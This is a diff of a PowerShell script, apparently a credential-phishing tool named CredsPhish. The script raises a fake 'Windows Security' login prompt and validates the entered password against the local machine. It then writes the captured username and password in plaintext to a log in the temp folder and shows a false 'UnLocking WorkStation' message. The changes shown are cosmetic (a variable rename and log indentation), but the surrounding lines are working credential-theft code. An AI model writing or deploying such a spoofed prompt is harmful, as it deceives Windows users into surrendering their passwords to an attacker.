@@ -36,11 +36,11 @@ while ($counter -lt '1000000000')
 
   Add-Type -assemblyname System.Windows.Forms
   Add-Type -assemblyname System.DirectoryServices.AccountManagement
-  $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+  $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your username and password.", $Account, "NetBiosUserName")
-  $validate = $DS.ValidateCredentials($account, $credential.GetNetworkCredential().password)
+  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $Account, "NetBiosUserName")
+  $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
     $pass = $credential.GetNetworkCredential().password;
@@ -52,11 +52,11 @@ while ($counter -lt '1000000000')
       $timestamp = Get-Date;
       $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
-      echo "Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
-      echo "----------------------------" >> $env:tmp\CredsPhish.log
-      echo "TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
-      echo "username  : $user" >> $env:tmp\CredsPhish.log
-      echo "password  : $pass" >> $env:tmp\CredsPhish.log
+      echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
+      echo "   ----------------------------" >> $env:tmp\CredsPhish.log
+      echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
+      echo "   username  : $user" >> $env:tmp\CredsPhish.log
+      echo "   password  : $pass" >> $env:tmp\CredsPhish.log
       Start-Process -FilePath $env:windir\explorer.exe
       exit
     }
